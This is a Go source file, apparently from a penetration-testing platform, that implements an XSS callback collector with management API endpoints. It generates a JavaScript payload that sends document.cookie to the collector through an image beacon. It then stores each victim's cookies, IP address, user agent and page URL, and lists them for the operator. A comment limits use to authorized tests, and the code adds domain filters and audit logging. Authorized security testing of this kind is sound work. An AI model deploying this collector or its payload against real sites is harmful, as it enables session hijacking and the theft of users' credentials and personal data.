package handler

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"jysecai/internal/audit"
	"jysecai/internal/config"
	"jysecai/internal/database"
	"jysecai/internal/security"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
)

// XssHandler handles the XSS callback collector and its authenticated
// management endpoints. The collector is intended for explicitly authorized
// test environments only.
type XssHandler struct {
	db     *database.DB
	cfg    *config.XssConfig
	logger *zap.Logger
	audit  *audit.Service

	collectorMu     sync.RWMutex
	collectorCancel context.CancelFunc
	collectorSrv    *http.Server

	captureMu   sync.Mutex
	lastCapture map[string]time.Time
}

func (h *XssHandler) SetAudit(s *audit.Service) {
	h.audit = s
}

func NewXssHandler(db *database.DB, cfg *config.XssConfig, logger *zap.Logger) *XssHandler {
	if cfg == nil {
		cfg = &config.XssConfig{}
	}
	if cfg.BindHost == "" {
		cfg.BindHost = "127.0.0.1"
	}
	if cfg.BindPort == 0 {
		cfg.BindPort = 18877
	}
	if cfg.CooldownSeconds == 0 {
		cfg.CooldownSeconds = 60
	}
	return &XssHandler{
		db:          db,
		cfg:         cfg,
		logger:      logger,
		lastCapture: make(map[string]time.Time),
	}
}

func (h *XssHandler) StartCollector() {
	h.collectorMu.Lock()
	defer h.collectorMu.Unlock()
	if h.collectorSrv != nil {
		return
	}

	addr := fmt.Sprintf("%s:%d", h.cfg.BindHost, h.cfg.BindPort)
	mux := http.NewServeMux()
	mux.HandleFunc("/xss/", h.serveCollector)
	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		IdleTimeout:       30 * time.Second,
	}
	ctx, cancel := context.WithCancel(context.Background())
	h.collectorCancel = cancel
	h.collectorSrv = srv

	go func() {
		<-ctx.Done()
		shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer shutdownCancel()
		if err := srv.Shutdown(shutdownCtx); err != nil && err != http.ErrServerClosed {
			h.logger.Warn("XSS collector shutdown error", zap.Error(err))
		}
	}()

	go func() {
		h.logger.Info("XSS collector server started", zap.String("addr", addr))
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			h.logger.Error("XSS collector server error", zap.Error(err))
		}
	}()
}

func (h *XssHandler) StopCollector() {
	h.collectorMu.Lock()
	cancel := h.collectorCancel
	h.collectorCancel = nil
	h.collectorSrv = nil
	h.collectorMu.Unlock()

	if cancel != nil {
		cancel()
	}
}

func (h *XssHandler) serveCollector(w http.ResponseWriter, r *http.Request) {
	path := strings.Trim(strings.TrimPrefix(r.URL.Path, "/xss/"), "/")
	switch {
	case strings.HasSuffix(path, ".js"):
		if r.Method != http.MethodGet && r.Method != http.MethodHead {
			w.Header().Set("Allow", "GET, HEAD")
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.ServeCollectorJS(w, r, strings.TrimSuffix(path, ".js"))
		return
	case strings.HasSuffix(path, ".gif"):
		if r.Method != http.MethodGet && r.Method != http.MethodHead {
			w.Header().Set("Allow", "GET, HEAD")
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.ServeCollectorGIF(w, r, strings.TrimSuffix(path, ".gif"))
		return
	}

	parts := strings.SplitN(path, "/", 2)
	if len(parts) == 2 && parts[1] == "capture" {
		if r.Method != http.MethodPost {
			w.Header().Set("Allow", "POST")
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		h.Capture(w, r, parts[0])
		return
	}
	http.NotFound(w, r)
}

func (h *XssHandler) publicCollectorURL() string {
	if v := strings.TrimRight(strings.TrimSpace(h.cfg.PublicURL), "/"); v != "" {
		return v
	}
	return fmt.Sprintf("http://%s:%d", h.cfg.BindHost, h.cfg.BindPort)
}

func validXssToken(token string) bool {
	token = strings.TrimSpace(token)
	if len(token) != 40 {
		return false
	}
	for _, ch := range token {
		if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
			return false
		}
	}
	return true
}

func (h *XssHandler) loadActivePayload(token string) (*database.XssPayload, error) {
	if !validXssToken(token) {
		return nil, nil
	}
	payload, err := h.db.GetXssPayloadByToken(strings.TrimSpace(token))
	if err != nil || payload == nil {
		return nil, err
	}
	if payload.Enabled != 1 {
		return nil, nil
	}
	return payload, nil
}

func requestHost(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	u, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	return strings.ToLower(strings.TrimSuffix(u.Hostname(), "."))
}

func payloadAllowsRequest(payload *database.XssPayload, r *http.Request) bool {
	if payload == nil || payload.Enabled != 1 {
		return false
	}
	if payload.DomainOnly == 0 || strings.TrimSpace(payload.Domain) == "" {
		return true
	}

	expected := strings.ToLower(strings.Trim(strings.TrimSpace(payload.Domain), "."))
	source := r.FormValue("url")
	if source == "" {
		source = r.Referer()
	}
	host := requestHost(source)
	if host == "" {
		return false
	}
	return host == expected || strings.HasSuffix(host, "."+expected)
}

func remoteHost(r *http.Request) string {
	host, _, err := net.SplitHostPort(strings.TrimSpace(r.RemoteAddr))
	if err != nil {
		host = strings.TrimSpace(r.RemoteAddr)
	}
	return host
}

// clientIP only trusts forwarding headers from a local reverse proxy. This
// avoids accepting spoofed X-Forwarded-For values on a directly exposed
// collector while still supporting the normal localhost reverse-proxy setup.
func clientIP(r *http.Request) string {
	direct := remoteHost(r)
	parsed := net.ParseIP(direct)
	if parsed == nil || !parsed.IsLoopback() {
		return direct
	}

	if v := strings.TrimSpace(r.Header.Get("CF-Connecting-IP")); v != "" {
		return v
	}
	if v := strings.TrimSpace(r.Header.Get("X-Real-IP")); v != "" {
		return v
	}
	if v := strings.TrimSpace(r.Header.Get("X-Forwarded-For")); v != "" {
		if i := strings.IndexByte(v, ','); i >= 0 {
			v = v[:i]
		}
		return strings.TrimSpace(v)
	}
	return direct
}

func requestUserAgent(r *http.Request) string {
	if v := strings.TrimSpace(r.FormValue("user_agent")); v != "" {
		return v
	}
	return r.UserAgent()
}

func requestSourceURL(r *http.Request) string {
	if v := strings.TrimSpace(r.FormValue("url")); v != "" {
		return v
	}
	return r.Referer()
}

func (h *XssHandler) allowCapture(token, ip string) bool {
	if h.cfg.CooldownSeconds <= 0 {
		return true
	}
	key := token + "|" + ip
	now := time.Now()
	window := time.Duration(h.cfg.CooldownSeconds) * time.Second

	h.captureMu.Lock()
	defer h.captureMu.Unlock()
	if prev, ok := h.lastCapture[key]; ok && now.Sub(prev) < window {
		return false
	}
	h.lastCapture[key] = now
	return true
}

var transparentGIF = []byte{
	0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
	0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02,
	0x02, 0x44, 0x01, 0x00, 0x3b,
}

func writeTransparentGIF(w http.ResponseWriter, status int) {
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(status)
	if status >= 200 && status < 300 {
		_, _ = w.Write(transparentGIF)
	}
}

// ServeCollectorJS serves the minimal callback script for an enabled payload.
func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, r *http.Request, token string) {
	payload, err := h.loadActivePayload(token)
	if err != nil || payload == nil || !payloadAllowsRequest(payload, r) {
		http.NotFound(w, r)
		return
	}

	js := h.renderCollectorJS(payload)
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(js))
}

func (h *XssHandler) renderCollectorJS(payload *database.XssPayload) string {
	return fmt.Sprintf(
		`(new Image()).src="%s/xss/%s.gif?cookie="+encodeURIComponent(document.cookie)`,
		h.publicCollectorURL(),
		payload.Token,
	)
}

// Capture accepts an authorized callback and persists a hit. Empty document.cookie
// is still a valid hit (for example, when all cookies are HttpOnly).
func (h *XssHandler) Capture(w http.ResponseWriter, r *http.Request, token string) {
	r.Body = http.MaxBytesReader(w, r.Body, 128*1024)
	if err := r.ParseForm(); err != nil {
		http.Error(w, "invalid capture body", http.StatusRequestEntityTooLarge)
		return
	}

	payload, err := h.loadActivePayload(token)
	if err != nil || payload == nil || !payloadAllowsRequest(payload, r) {
		http.NotFound(w, r)
		return
	}

	ip := clientIP(r)
	if !h.allowCapture(payload.Token, ip) {
		writeTransparentGIF(w, http.StatusOK)
		return
	}

	cookie := r.FormValue("cookie")
	sourceURL := requestSourceURL(r)
	userAgent := requestUserAgent(r)
	referrer := r.FormValue("document_referrer")
	if len(cookie) > 64*1024 || len(sourceURL) > 8*1024 || len(userAgent) > 4*1024 || len(referrer) > 8*1024 {
		http.Error(w, "capture fields too large", http.StatusRequestEntityTooLarge)
		return
	}
	if referrer == "" {
		referrer = r.Referer()
	}
	extra := ""
	if referrer != "" {
		extra = fmt.Sprintf("referrer=%s", referrer)
	}

	if _, err := h.db.CreateXssCapture(payload.ID, payload.Token, cookie, sourceURL, payload.Domain, userAgent, ip, extra); err != nil {
		h.logger.Error("XSS capture persistence failed", zap.Error(err), zap.Int64("payload_id", payload.ID), zap.String("ip", ip))
		http.Error(w, "capture persistence failed", http.StatusInternalServerError)
		return
	}

	h.logger.Info("XSS capture received", zap.Int64("payload_id", payload.ID), zap.String("ip", ip), zap.String("source_host", requestHost(sourceURL)))
	writeTransparentGIF(w, http.StatusOK)
}

func (h *XssHandler) ServeCollectorGIF(w http.ResponseWriter, r *http.Request, token string) {
	payload, err := h.loadActivePayload(token)
	if err != nil || payload == nil || !payloadAllowsRequest(payload, r) {
		http.NotFound(w, r)
		return
	}

	ip := clientIP(r)
	if !h.allowCapture(payload.Token, ip) {
		writeTransparentGIF(w, http.StatusOK)
		return
	}

	cookie := r.URL.Query().Get("cookie")
	sourceURL := r.URL.Query().Get("url")
	if len(cookie) > 64*1024 || len(sourceURL) > 8*1024 {
		http.Error(w, "capture fields too large", http.StatusRequestEntityTooLarge)
		return
	}
	if sourceURL == "" {
		sourceURL = r.Referer()
	}
	userAgent := r.URL.Query().Get("user_agent")
	if userAgent == "" {
		userAgent = r.UserAgent()
	}

	if _, err := h.db.CreateXssCapture(payload.ID, payload.Token, cookie, sourceURL, payload.Domain, userAgent, ip, ""); err != nil {
		h.logger.Error("XSS image-beacon persistence failed", zap.Error(err), zap.Int64("payload_id", payload.ID), zap.String("ip", ip))
		writeTransparentGIF(w, http.StatusInternalServerError)
		return
	}

	h.logger.Info("XSS capture (img beacon) received", zap.Int64("payload_id", payload.ID), zap.String("ip", ip))
	writeTransparentGIF(w, http.StatusOK)
}

// === Authenticated management endpoints ===

func (h *XssHandler) GetConfig(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"enabled":          h.cfg.Enabled,
		"bind_host":        h.cfg.BindHost,
		"bind_port":        h.cfg.BindPort,
		"public_url":       h.publicCollectorURL(),
		"cooldown_seconds": h.cfg.CooldownSeconds,
	})
}

func (h *XssHandler) ListPayloads(c *gin.Context) {
	payloads, err := h.db.ListXssPayloads()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	result := make([]gin.H, len(payloads))
	for i, p := range payloads {
		result[i] = gin.H{
			"id":            p.ID,
			"token":         p.Token,
			"name":          p.Name,
			"type":          p.Type,
			"payload":       p.Payload,
			"config":        string(p.Config),
			"project_id":    p.ProjectID,
			"enabled":       p.Enabled == 1,
			"description":   p.Description,
			"domain":        p.Domain,
			"domain_only":   p.DomainOnly,
			"created_at":    p.CreatedAt,
			"updated_at":    p.UpdatedAt,
			"created_by":    p.CreatedBy,
			"capture_count": p.CaptureCount,
		}
	}
	c.JSON(http.StatusOK, gin.H{"payloads": result, "total": len(result)})
}

func (h *XssHandler) CreatePayload(c *gin.Context) {
	var req struct {
		Name        string `json:"name"`
		Type        string `json:"type"`
		Payload     string `json:"payload"`
		Config      string `json:"config"`
		ProjectID   string `json:"project_id"`
		Enabled     *bool  `json:"enabled"`
		Description string `json:"description"`
		Domain      string `json:"domain"`
		DomainOnly  *int   `json:"domain_only"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.Name = strings.TrimSpace(req.Name)
	if req.Name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "name is required"})
		return
	}

	token := database.GenerateXssToken()
	p := &database.XssPayload{
		Token:       token,
		Name:        req.Name,
		Type:        strings.TrimSpace(req.Type),
		Payload:     req.Payload,
		Config:      []byte(req.Config),
		ProjectID:   strings.TrimSpace(req.ProjectID),
		Enabled:     1,
		Description: strings.TrimSpace(req.Description),
		Domain:      strings.Trim(strings.ToLower(strings.TrimSpace(req.Domain)), "."),
	}
	if p.Type == "" {
		p.Type = "image"
	}
	if req.Enabled != nil && !*req.Enabled {
		p.Enabled = 0
	}
	if req.DomainOnly != nil {
		p.DomainOnly = *req.DomainOnly
	}

	if session, ok := security.CurrentSession(c); ok {
		p.CreatedBy = session.UserID
		p.OwnerUserID = session.UserID
	}

	id, err := h.db.CreateXssPayload(p)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if p.OwnerUserID != "" {
		resourceID := strconv.FormatInt(id, 10)
		_ = h.db.SetResourceOwner("xss_payload", resourceID, p.OwnerUserID)
		_ = h.db.AssignResourceToUser(p.OwnerUserID, "xss_payload", resourceID)
	}

	if h.audit != nil {
		h.audit.RecordOK(c, "xss", "payload_create", "创建 XSS 载荷", "xss_payload", strconv.FormatInt(id, 10), map[string]interface{}{
			"name": req.Name,
		})
	}

	c.JSON(http.StatusOK, gin.H{
		"id":         id,
		"token":      token,
		"public_url": h.publicCollectorURL() + "/xss/" + token + ".js",
	})
}

func (h *XssHandler) GetPayload(c *gin.Context) {
	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload id"})
		return
	}
	payload, err := h.db.GetXssPayload(id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if payload == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "payload not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"id":            payload.ID,
		"token":         payload.Token,
		"name":          payload.Name,
		"type":          payload.Type,
		"payload":       payload.Payload,
		"config":        string(payload.Config),
		"project_id":    payload.ProjectID,
		"enabled":       payload.Enabled == 1,
		"description":   payload.Description,
		"domain":        payload.Domain,
		"domain_only":   payload.DomainOnly,
		"created_at":    payload.CreatedAt,
		"updated_at":    payload.UpdatedAt,
		"created_by":    payload.CreatedBy,
		"capture_count": payload.CaptureCount,
	})
}

func (h *XssHandler) DeletePayload(c *gin.Context) {
	id, err := strconv.ParseInt(c.Param("id"), 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload id"})
		return
	}
	if err := h.db.DeleteXssPayload(id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if h.audit != nil {
		h.audit.RecordOK(c, "xss", "payload_delete", "删除 XSS 载荷", "xss_payload", strconv.FormatInt(id, 10), nil)
	}
	c.JSON(http.StatusOK, gin.H{"deleted": true})
}

func (h *XssHandler) ListCaptures(c *gin.Context) {
	var captures []*database.XssCapture
	var err error
	if payloadIDStr := c.Query("payload_id"); payloadIDStr != "" {
		pid, perr := strconv.ParseInt(payloadIDStr, 10, 64)
		if perr != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_id"})
			return
		}
		captures, err = h.db.ListXssCapturesByPayload(pid)
	} else {
		captures, err = h.db.ListXssCaptures()
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	result := make([]gin.H, len(captures))
	for i, cap := range captures {
		result[i] = gin.H{
			"id":         cap.ID,
			"payload_id": cap.PayloadID,
			"token":      cap.Token,
			"cookie":     cap.Cookie,
			"url":        cap.URL,
			"domain":     cap.Domain,
			"user_agent": cap.UserAgent,
			"ip":         cap.IP,
			"extra":      cap.Extra,
			"created_at": cap.CreatedAt,
		}
	}
	c.JSON(http.StatusOK, gin.H{"captures": result, "total": len(result)})
}
